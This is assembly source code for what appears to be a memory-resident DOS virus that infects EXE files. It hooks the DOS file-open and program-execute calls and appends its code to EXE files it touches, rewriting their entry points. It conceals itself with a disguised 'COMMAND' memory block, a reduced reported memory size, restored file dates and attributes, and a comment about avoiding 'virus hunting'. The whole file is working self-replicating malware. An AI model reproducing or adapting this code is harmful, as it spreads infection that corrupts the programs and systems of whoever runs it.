cseg    segment public
        assume  cs:cseg
        assume  ds:cseg
        org 100h
begin:
        jmp first
toexit:
        int 20h


install proc    near
        push ax
        push es
        push bx
        push cx
        push ds
;       jmp ISR21                               ;DEBUG!!!!!!
;       jmp igohome                             ;DEBUG!!!!!!
;................ ISR21 alredy resident ? ........
        xor bx,bx
        mov ah,IDENT
        int 21h
        cmp bl,IDENT
        jne i1
        jmp igohome
i1:
;................ ISR21 alredy resident ? ........ END
;................ get real 21 ............
        xor ax,ax                               ;i21*** variables will
        mov es,ax                               ;be transferred with
                                                ;all the code.
        mov bp,21h*4
        mov ax,es:[bp+2]
        mov cs:i21seg,ax
        mov ax,es:[bp]
        mov cs:i21off,ax
;................ get real 21 ........... END
;.............. reserve block ...........
        mov ax,ds                               ;in EXE files CS does not
                                                ;points to start seg!!!!
        dec ax
        mov ds,ax
        mov ax,ds:1                             ;this block
        add ax,ds:3                             ;lenght
        sub ax,NOB+1h                           ;100h blocks = 100h*0fh
        mov es,ax
        mov bl,ds:0                             ; M or Z
        mov es:0,bl
        inc ax
        mov es:1,ax                             ;adress of new block (MCB++)
        mov ax,NOB
        mov es:3,ax                             ;number of blocks
        mov al,'Z'+80h                          ;'M'+80h
        sub al,80h
        mov ds:0,al                             ;not the last
        mov ax,ds:3
        sub ax,NOB+1
        mov ds:3,ax

;       mov ax,ds
;       inc ax
;       mov ds,ax

        push cs
        pop ds
        mov si,offset pname
        mov di,08
        mov cx,8
        cld
        rep movsb

        mov di,08
        mov cx,8

decode:
        mov al,es:[di]
        sub al,0b0h
        mov es:[di],al
        inc di
        loop decode

;............ reserve block........ end
;............ move me to that block......
        push cs
        pop ds
        mov ax,es
        inc ax                                  ;es wast setted to MCB
        mov es,ax
        xor di,di                               ;to 0
        mov si,offset begin
        mov cx,myend-begin
        cld
        rep movsb                               ;transfer to ....
;............ move me to that block......END

;............. set new int 21 ...........
        mov ax,es
        sub ax,10h                                      ;x:y=x-10:y+100
        xor bx,bx
        mov es,bx
        cli
        mov es:21h*4+2,ax
        mov es:21h*4,offset ISR21
        sti
;............. set new int 21 ...........END
igohome:

        pop ds

        mov ax,cs:EntPCS
        mov cx,ds
        add ax,cx
        add ax,10h                              ;
        mov cs:EntPCS,ax

        mov ax,40h
        mov es,ax
        mov ax,es:13h
        sub ax,100h/40h                         ;para/40h=kbyte
        mov es:13h,ax

        pop cx
        pop bx
        pop es
        pop ax

        push cs:EntPCS
        push cs:EntPIP
        mov dx,0
        retf
NOB     equ     100h                            ;number of blocks
pname   db 'C'+0b0h,'O'+0b0h,'M'+0b0h,'M'+0b0h,'A'+0b0h,'N'+0b0h,'D'+0b0h,0+0b0h
install endp

ISR21   proc    near
        push ax
;       jmp noany                       ;DEBUG!!!!!!!!!!
        cmp ah,4bh                      ;EXEC
        je go
;       cmp ah,3fh                      ;read
;       je go
        cmp ah,3dh                      ;open file
        je go
        cmp ah,IDENT                    ;echo
        je answer
noany:
        pop ax                          ;REALIZE!!!!!!!!
        jmp dword ptr cs:i21off         ;REALIZE!!!!!!!!
answer:
        mov bl,IDENT
        pop ax
        iret
go:
        push ds
        push es
        push bp
        push bx
        push dx
        push cx
        push di

        mov ax,ds
        mov cs:OrigDS,ax
        push cs
        pop ds

        mov cs:fname,dx
;******************** change INT 24
        xor ax,ax
        mov es,ax

        mov bp,24h*4
        mov ax,es:[bp+2]
        mov cs:i24seg,ax
        mov ax,es:[bp]
        mov cs:i24off,ax

        push cs
        pop es:24h*4+2
        mov es:24h*4,offset myi24

;******************** change INT 24 end

;............ store old and set new DTA
        push cs
        pop ds
        mov ax,2f00h                    ;get DTA
        pushf
        call dword ptr cs:i21off

        mov cs:DTAseg,es
        mov cs:DTAoff,bx

        lea dx,DTA                      ;set DTA
        mov ax,1a00h
        pushf
        call dword ptr cs:i21off

;......... get attribute, sve it and change to not r/o
        mov ax,4300h                    ;al=00-get attrib
        mov dx,cs:fname                 ;ds is set to old

        push cs:OrigDS
        pop ds

        pushf
        call dword ptr cs:i21off
        jnc c01
        jmp ferr
c01:
        mov cs:attr,cx                  ;save current attributes
        mov dx,cs:fname
        xor cx,cx
        mov ax,4301h                    ;al=1-set attrib
        pushf
        call dword ptr cs:i21off
        jnc c02
        jmp ferr
c02:
;......... get attribute, save it and change to not r/o   END


        mov dx,cs:fname
        mov al,02       ;read/write
        mov ah,3dh      ;open file
        pushf
        call dword ptr cs:i21off
        mov cs:fhan,ax
        jnc c1
        jmp ferr
c1:

        push cs
        pop ds

;.............. get file date & time & store it
        mov ax,5700h                    ;al=0-get
        mov bx,cs:fhan
        push cs
        pop es
        lea di,header
        pushf
        call dword ptr cs:i21off
        jnc c11
        jmp ferr
c11:
        mov cs:rdate,cx
        mov cs:rtime,dx
;.............. get file date & time & store it  END


        mov ax,3f00h
        mov bx,cs:fhan
        lea dx,header
        mov cx,1ch
        pushf
        call dword ptr cs:i21off
        jnc c2
        jmp ferr
c2:
        mov ax,cs:header
        add ax,08080h
        cmp ax,'ZM'+08080h
        je c3
        jmp ferr
c3:
        mov ax,cs:ChkSum                ;already cripled??
        cmp ax,IDENT
        jne c31
        jmp dat_attr_cl

c31:
        mov ax,4202h                    ;lseek to end
        mov bx,cs:fhan
        xor cx,cx
        xor dx,dx
        pushf
        call dword ptr cs:i21off
        jnc c4
        jmp ferr
c4:
        mov cs:flh,dx
        mov cs:fll,ax
	   
	cmp dx,0
	jne c41
	cmp ax,MINLEN				;minimum lenght of EXE file
	ja c41					;to avoid virus hunting
	jmp ferr				;on dummy programs


c41:
        mov cx,9

c4l1:
        shr ax,1
        shr dx,1
        jnc c4l2
        or ax,08000h
c4l2:
        loop c4l1
        inc ax

        mov cx,cs:PageCnt
;        shl cx,1                        ;PageCnt (shl 8+1)=*512

        cmp ax,cx
        jbe c5
        jmp ferr                        ;file has additional info!!
c5:
        mov cx,cs:HdrSize
        shl cx,1                        ;header lenght
        shl cx,1
        shl cx,1
        shl cx,1

        mov ax,cs:fll
        sub ax,cx
        and ax,01111b                   ;more than para
        mov cx,10h                      ;one para
        sub cx,ax                       ;byte to add in cx
        cmp cx,10h
        je c6

        add cs:fll,cx
        ;.......... write cx additional to para bytes in file
        mov ax,4000h                    ;write to file
                                        ;cx already installed
        mov bx,cs:fhan
        lea dx,cs:filler
        pushf
        call dword ptr cs:i21off
        jnc c6
        jmp ferr
c6:
;*******************

        mov ax,cs:ReloCS
        mov cs:EntPCS,ax
        mov ax,cs:ExeIP
        mov cs:EntPIP,ax

        mov ax,4000h                    ;write to file
                                        ;cx already installed
        mov bx,cs:fhan
        mov cx,myend-begin
        lea dx,begin
        pushf
        call dword ptr cs:i21off
        jnc c61
        jmp ferr
c61:
;************************
        ;........... change ReloCS........


        mov dx,cs:flh
        cmp dx,0fh                      ;(0fh+byte)shr4=byte
        jbe c7
        jmp ferr
c7:
        mov ax,cs:fll
        mov dx,cs:flh
        mov cx,4
cl1:
        shr ax,1
        shr dx,1
        jnc cl2
        or ax,08000h
cl2:
        loop cl1
        mov cx,cs:HdrSize
        sub ax,cx
        sub ax,10h                      ;because IP=100h=10h para
        mov cs:ReloCS,ax
        mov cs:ExeIP,offset install
        inc cs:PageCnt                  ;add 1024 bytes
        inc cs:PageCnt
        mov cs:ChkSum,IDENT

        mov ax,4200h                    ;lseek to begin
        mov bx,cs:fhan
        xor cx,cx
        xor dx,dx
        pushf
        call dword ptr cs:i21off
        jnc c8
        jmp ferr
c8:
        mov ax,4000h                    ;write to file
        mov cx,1ch
        mov bx,cs:fhan
        lea dx,cs:header
        pushf
        call dword ptr cs:i21off
        jnc c9
        jmp ferr
c9:
dat_attr_cl:
;.............. restore previos file date & time
        mov cx,cs:rdate
        mov dx,cs:rtime
        mov ax,5701h                    ;al=1-set
        mov bx,cs:fhan
        push cs
        pop es
        lea di,header
        pushf
        call dword ptr cs:i21off
        jnc c91
        jmp ferr
c91:

;.............. restore file date & time  END

        ;........... close file ...........
        mov ax,3e00h                    ;fclose
        mov bx,cs:fhan
        pushf
        call dword ptr cs:i21off


;......... restore previus file attribute
        mov cx,cs:attr
        mov dx,cs:fname
        push cs:OrigDS
        pop ds
        mov ax,4301h                    ;al=1-set attrib
        pushf
        call dword ptr cs:i21off
        jnc c10
        jmp ferr
c10:
        jmp toend

ferr:
;        jmp toend

toend:
;..... restore INT 24
        mov bp,24h*4
        mov ax,cs:i24seg
        mov es:[bp+2],ax
        mov ax,cs:i24off
        mov es:[bp],ax

;..... restore DTA
        mov dx,cs:DTAoff
        push cs:DTAseg
        pop ds
        mov ax,1a00h                            ;set DTA
        pushf
        call dword ptr cs:i21off

        pop di
        pop cx
        pop dx
        pop bx
        pop bp
        pop es
        pop ds
        pop ax
;       ret                             ;DBUG!!!!!!!!!!!!!!!
        jmp dword ptr cs:i21off         ;REALIZE !!!!!!!!!!!
;**************** INT 24 ISR
myi24:
        mov al,03h                      ;fail system call
        iret
;**************** INT 24 ISR end

IDENT   equ 080h
MINLEN	equ 1400h			;5k

i21off  dw ?
i21seg  dw ?

EntPCS  dw ?
EntPIP  dw ?

myend:

OrigDS  dw ?
i24off  dw ?
i24seg  dw ?

fhan    dw ?
flh     dw ?
fll     dw ?
DTAoff  dw ?
DTAseg  dw ?
attr    dw ?
rtime   dw ?
rdate   dw ?
;.......... exe header .......... lenght:1ch
header  dw 0            ;signature
PartPag dw 0
PageCnt dw 0
ReloCnt dw 0
HdrSize dw 0
MinMem  dw 0
MaxMem  dw 0
ReloSS  dw 0
ExeSp   dw 0
ChkSum  dw 0
ExeIP   dw 0
ReloCS  dw 0
TablOff dw 0
Overlay dw 0
reloc   db 0            ;end = 1ch
filler  db '123456789abcdef'
DTA     db 80h dup('X')
fname   dw ?
ISR21   endp

first:                                  ;only in this file!!!
        mov cs:EntPIP,offset toexit
        xor ax,ax
        sub ax,10h
        mov cs:EntPCS,ax

        jmp install

cseg    ends
        end     begin